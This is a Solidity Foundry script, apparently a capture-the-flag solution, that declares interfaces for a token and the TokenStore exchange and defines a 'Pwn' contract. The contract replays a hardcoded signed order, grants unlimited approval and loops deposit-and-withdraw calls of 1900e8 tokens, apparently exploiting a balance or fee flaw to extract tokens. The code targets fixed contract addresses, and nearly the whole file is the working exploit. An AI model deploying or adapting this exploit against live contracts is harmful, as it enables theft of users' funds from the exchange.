// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import { Challenge } from "../src/Challenge.sol";
import { CommonBase } from "forge-std/Base.sol";
import "forge-std/console.sol";

interface Token {
    event AllowanceUsed(address indexed spender, address indexed owner, uint256 indexed value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Burn(address indexed addr, uint256 indexed value);
    event Mint(address indexed addr, uint256 indexed value);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Transfer2(address indexed from, address indexed to, uint256 indexed value, bytes data);

    function allowance(address owner, address spender) external view returns (uint256 remaining, uint256 nonce);
    function approve(address spender, uint256 amount) external returns (bool _success);
    function balanceOf(address owner) external view returns (uint256 value);
    function balancesOf(address owner) external view returns (uint256 balance, uint256 lockedAmount);
    function changeDataBaseAddress(address newDatabaseAddress) external;
    function changeDepositsAddress(address newDepositsAddress) external;
    function changeFees(uint256 rate, uint256 rateMultiplier, uint256 min, uint256 max) external;
    function changeForkAddress(address newForkAddress) external;
    function changeLibAddress(address newLibAddress) external;
    function databaseAddress() external view returns (address);
    function decimals() external view returns (uint8);
    function depositsAddress() external view returns (address);
    function forkAddress() external view returns (address);
    function getTransactionFee(uint256 value) external view returns (bool success, uint256 fee);
    function libAddress() external view returns (address);
    function mint(address owner, uint256 value) external returns (bool success);
    function name() external view returns (string memory);
    function owner() external view returns (address);
    function replaceOwner(address newOwner) external returns (bool success);
    function symbol() external view returns (string memory);
    function totalSupply() external view returns (uint256 value);
    function transactionFeeMax() external view returns (uint256);
    function transactionFeeMin() external view returns (uint256);
    function transactionFeeRate() external view returns (uint256);
    function transactionFeeRateM() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool success);
    function transfer(address to, uint256 amount, bytes memory extraData) external returns (bool success);
    function transferFrom(address from, address to, uint256 amount) external returns (bool success);
}

interface TokenStore {
    event Cancel(
        address tokenGet,
        uint256 amountGet,
        address tokenGive,
        uint256 amountGive,
        uint256 expires,
        uint256 nonce,
        address user,
        uint8 v,
        bytes32 r,
        bytes32 s
    );
    event Deposit(address token, address user, uint256 amount, uint256 balance);
    event FundsMigrated(address user);
    event Trade(
        address tokenGet,
        uint256 amountGet,
        address tokenGive,
        uint256 amountGive,
        address get,
        address give,
        uint256 nonce
    );
    event Withdraw(address token, address user, uint256 amount, uint256 balance);

    function amountFilled(
        address _tokenGet,
        uint256 _amountGet,
        address _tokenGive,
        uint256 _amountGive,
        uint256 _expires,
        uint256 _nonce,
        address _user
    ) external returns (uint256);
    function availableVolume(
        address _tokenGet,
        uint256 _amountGet,
        address _tokenGive,
        uint256 _amountGive,
        uint256 _expires,
        uint256 _nonce,
        address _user,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) external returns (uint256);
    function balanceOf(address _token, address _user) external returns (uint256);
    function cancelOrder(
        address _tokenGet,
        uint256 _amountGet,
        address _tokenGive,
        uint256 _amountGive,
        uint256 _expires,
        uint256 _nonce,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) external;
    function changeAccountModifiers(address _accountModifiers) external;
    function changeFee(uint256 _fee) external;
    function changeFeeAccount(address _feeAccount) external;
    function changeTradeTracker(address _tradeTracker) external;
    function deposit() external payable;
    function depositForUser(address _user) external;
    function depositToken(address _token, uint256 _amount) external;
    function depositTokenForUser(address _token, uint256 _amount, address _user) external;
    function deprecate(bool _deprecated, address _successor) external;
    function deprecated() external returns (bool);
    function fee() external returns (uint256);
    function getAccountModifiers() external returns (uint256 takeFeeDiscount, uint256 rebatePercentage);
    function migrateFunds(address[] memory _tokens) external;
    function orderFills(address, bytes32) external returns (uint256);
    function owner() external returns (address);
    function predecessor() external returns (address);
    function successor() external returns (address);
    function testTrade(
        address _tokenGet,
        uint256 _amountGet,
        address _tokenGive,
        uint256 _amountGive,
        uint256 _expires,
        uint256 _nonce,
        address _user,
        uint8 _v,
        bytes32 _r,
        bytes32 _s,
        uint256 _amount,
        address _sender
    ) external returns (bool);
    function tokens(address, address) external returns (uint256);
    function trade(
        address _tokenGet,
        uint256 _amountGet,
        address _tokenGive,
        uint256 _amountGive,
        uint256 _expires,
        uint256 _nonce,
        address _user,
        uint8 _v,
        bytes32 _r,
        bytes32 _s,
        uint256 _amount
    ) external;
    function transferOwnership(address _newOwner) external;
    function version() external returns (uint16);
    function withdraw(uint256 _amount) external;
    function withdrawToken(address _token, uint256 _amount) external;
}

contract Pwn {
    TokenStore immutable store = TokenStore(0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8);
    Token immutable token = Token(0xC937f5027D47250Fa2Df8CbF21F6F88E98817845);
    constructor() payable {
        store.deposit{value: msg.value}();
        store.trade(
            address(0),
            0x12a6d8e11220000,
            address(token),
            0x2e90edd000,
            0x6721eca,
            0x1c116a56,
            0xa219Fb3CfAE449F6b5157c1200652cc13e9c9EA8,
            uint8(0x1c),
            0xf164a3e185694dadeb11a9e9e7371929675d2eb2a6e9daa4508e96bc81741018,
            0x314f3b6d5ce7c3f396604e87373fe4fe0a10bef597287d840b942e57595cb29a,
            79800000000000000
        );
        token.approve(address(store), (uint256)((int256)(-1)));
        console.log(store.balanceOf(address(token), address(this)));
        store.withdrawToken(address(token), 1900e8);
    }

    function doSteps(uint256 numSteps) external {
        for (uint256 i = 0; i < numSteps; i++) {
            store.depositToken(address(token), 1900e8);
            store.withdrawToken(address(token), 1900e8);
        }
    }
}

contract Solve is CommonBase {
    Challenge chal;
    uint256 privKey;

    uint256 constant TOTAL_STEPS = 600000;
    uint256 constant NUM_STEPS = 10000;

    TokenStore immutable store = TokenStore(0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8);
    Token immutable token = Token(0xC937f5027D47250Fa2Df8CbF21F6F88E98817845);

    constructor() {
        chal = Challenge(vm.envAddress("CHAL_ADDR"));
        privKey = uint256(vm.envBytes32("PRIV_KEY"));
    }

    function run() public {
        vm.startBroadcast(privKey);
        Pwn p = new Pwn{value: 1 ether}();
        vm.stopBroadcast();
        console.log(store.balanceOf(address(token), address(p)));
        console.log(token.balanceOf(address(p)));
        p.doSteps(10);
        console.log(store.balanceOf(address(token), address(p)));
        console.log(token.balanceOf(address(p)));
    }
}
